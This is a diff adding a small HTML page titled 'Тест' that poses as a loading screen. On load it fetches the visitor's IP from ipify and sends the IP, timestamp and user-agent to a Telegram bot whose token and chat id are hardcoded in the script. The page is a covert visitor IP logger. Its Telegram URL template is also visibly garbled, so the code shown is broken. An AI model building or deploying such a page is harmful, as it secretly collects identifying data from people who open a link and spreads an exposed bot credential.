@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Тест</title>
+  <style>
+    body { font-family: Arial; text-align: center; padding: 50px; background: #111; color: #0f0; }
+    h1 { color: #f44; }
+  </style>
+</head>
+<body>
+  <h1>Загружается...</h1>
+  <p id="info">Жди секунду</p>
+
+  <script>
+    async function sendToTelegram(ip) {
+      const token = "8564854246:AAEP6PZzYjG2PcUdRX-R4BqtTZi-cA_ZL_Y";
+      const chat_id = "5684291694";
+      const text = `Новый заход!\nIP: ${ip}\nВремя: ${new Date().toLocaleString()}\nUser-Agent: ${navigator.userAgent}`;
+
+      const url = `https://api.telegram.org/bot\( {token}/sendMessage?chat_id= \){chat_id}&text=${encodeURIComponent(text)}`;
+
+      try {
+        const res = await fetch(url);
+        if (res.ok) {
+          document.getElementById("info").innerHTML = "Данные отправлены в Telegram";
+        } else {
+          document.getElementById("info").innerHTML = "Ошибка отправки";
+        }
+      } catch (e) {
+        document.getElementById("info").innerHTML = "Ошибка: " + e.message;
+      }
+    }
+
+    async function getIPAndSend() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        const ip = data.ip;
+        await sendToTelegram(ip);
+      } catch (e) {
+        await sendToTelegram("Не удалось получить IP");
+      }
+    }
+
+    // Запуск при загрузке страницы
+    window.onload = getIPAndSend;
+  </script>
+</body>
+</html>
